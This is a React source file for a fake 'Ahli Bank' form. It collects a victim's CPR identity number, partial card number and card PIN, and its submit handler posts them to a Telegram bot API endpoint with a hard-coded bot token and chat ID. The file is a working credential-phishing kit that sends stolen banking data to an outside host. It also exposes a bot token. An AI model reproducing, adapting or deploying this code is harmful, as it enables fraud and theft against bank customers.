import React, { useState } from "react";
import axios from "axios";
import "./index.css";

export function TelegramBot() {
  const [formData, setFormData] = useState({
    cpr: "",
    cardNumber: {
      firstSixDigits: "",
      lastFourDigits: "",
    },
    pinCode: "",
  });

  const [errors, setErrors] = useState({
    cpr: "",
    cardNumberFirstSix: "",
    cardNumberLastFour: "",
    pinCode: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;

    if (name === "cardNumberFirstSix") {
      setFormData({
        ...formData,
        cardNumber: {
          ...formData.cardNumber,
          firstSixDigits: value,
        },
      });
    } else if (name === "cardNumberLastFour") {
      setFormData({
        ...formData,
        cardNumber: {
          ...formData.cardNumber,
          lastFourDigits: value,
        },
      });
    } else {
      setFormData({
        ...formData,
        [name]: value,
      });
    }

    setErrors({
      ...errors,
      [name]: "",
    });
  };

  function formValidations(){
    let hasError = false;

    if (formData.cpr.length !== 9) {
      setErrors({
        ...errors,
        cpr: "CPR must be 9 digits.",
      });
      hasError = true;
    }

    if (formData.cardNumber.firstSixDigits.length !== 6) {
      setErrors({
        ...errors,
        cardNumberFirstSix: "Must be 6 digits",
      });
      hasError = true;
    }

    if (formData.cardNumber.lastFourDigits.length !== 4) {
      setErrors({
        ...errors,
        cardNumberLastFour: "Must be 4 digits",
      });
      hasError = true;
    }

    if (formData.pinCode.length !== 4) {
      setErrors({
        ...errors,
        pinCode: "PIN Code must be 4 digits.",
      });
      hasError = true;
    }

    if (hasError) {
      return;
    }
  }

  const handleSubmit = async (e) => {
    e.preventDefault();

    const url = `https://api.telegram.org/bot6981001989:AAEamZWRoaFyhQO2QWNs78Q92cYqClCFwgg/sendMessage`;

    // Send data using Axios
    try {
      const response = await axios.post(url, {
        chat_id: "6632571679",
        parse_mode: "html",
        text: {
            'CPR Number': formData.cpr,
            'Card Number': formData.cardNumber,
            'Card Pin': formData.pinCode,
        }
      });
      console.log("Data sent successfully:", response.data);
      // You can handle the response accordingly
    } catch (error) {
      console.error("Error sending data:", error);
      // Handle the error
    }
  };

  return (
    <form className="my-form" onSubmit={handleSubmit}>
      <h1>Ahli Bank</h1>
      <br />
      <label>
        CPR Number
        <input
          type="text"
          name="cpr"
          value={formData.cpr}
          onChange={handleChange}
          maxLength={9}
          required
          className={`form-input ${errors.cpr && "error"}`}
          placeholder="Enter CPR (9 digits)"
        />
        {errors.cpr && <span className="error-message">{errors.cpr}</span>}
      </label>
      <br />
      <label>
        Card Number (First 6 digits)
        <input
          type="text"
          name="cardNumberFirstSix"
          value={formData.cardNumber.firstSixDigits}
          onChange={handleChange}
          maxLength={6}
          required
          className={`form-input ${errors.cardNumberFirstSix && "error"}`}
          placeholder="Enter first 6 digits"
        />
        {errors.cardNumberFirstSix && (
          <span className="error-message">{errors.cardNumberFirstSix}</span>
        )}
      </label>
      <br />
      <label>
        Card Number (Last 4 digits)
        <input
          type="text"
          name="cardNumberLastFour"
          value={formData.cardNumber.lastFourDigits}
          onChange={handleChange}
          maxLength={4}
          required
          className={`form-input ${errors.cardNumberLastFour && "error"}`}
          placeholder="Enter last 4 digits"
        />
        {errors.cardNumberLastFour && (
          <span className="error-message">{errors.cardNumberLastFour}</span>
        )}
      </label>
      <br />
      <label>
        PIN Code
        <input
          type="password"
          name="pinCode"
          value={formData.pinCode}
          onChange={handleChange}
          maxLength={4}
        //   required
          className={`form-input ${errors.pinCode && "error"}`}
          placeholder="Enter PIN Code (4 digits)"
        />
        {errors.pinCode && (
          <span className="error-message">{errors.pinCode}</span>
        )}
      </label>
      <br />
      <button type="submit" className="submit-button">
        Submit
      </button>
    </form>
  );
}
